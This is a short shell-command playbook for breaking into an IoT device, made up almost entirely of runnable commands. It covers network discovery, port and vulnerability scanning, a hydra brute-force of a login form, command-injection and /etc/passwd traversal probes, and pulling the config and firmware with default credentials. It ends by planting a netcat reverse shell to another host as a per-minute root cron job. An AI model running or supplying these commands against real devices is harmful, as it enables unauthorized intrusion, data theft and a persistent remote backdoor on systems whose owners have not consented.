# Step 1: Network Discovery
nmap -sn 192.168.1.0/24
sudo netdiscover -r 192.168.1.0/24

# Step 2: Port Scanning
nmap -sV -sC -p- --open -oA iot_full_scan 192.168.1.100

# Step 3: Service Enumeration
# Web interfaces
whatweb http://192.168.1.100
dirb http://192.168.1.100 /usr/share/wordlists/dirb/common.txt

# Special protocols
nmap --script coap-resources -p 5683 192.168.1.100
nmap --script upnp-info -p 1900 192.168.1.100

# Step 4: Vulnerability Scanning
nmap --script vuln 192.168.1.100
nikto -h http://192.168.1.100

# Step 5: Exploitation
# Try default credentials
hydra -L users.txt -P passwords.txt 192.168.1.100 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"

# Check for command injection
curl "http://192.168.1.100/ping.cgi?ip=127.0.0.1;id"
curl "http://192.168.1.100/config.cgi?file=/etc/passwd"

# Step 6: Post-Exploitation
# Download configuration
curl http://admin:admin@192.168.1.100/config.bak -o device_config.bak

# Extract firmware
curl http://admin:admin@192.168.1.100/cgi-bin/firmware.cgi -o firmware.bin

# Establish persistence
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.50 4444 >/tmp/f" > /tmp/backdoor.sh
chmod +x /tmp/backdoor.sh
echo "* * * * * root /tmp/backdoor.sh" >> /etc/crontab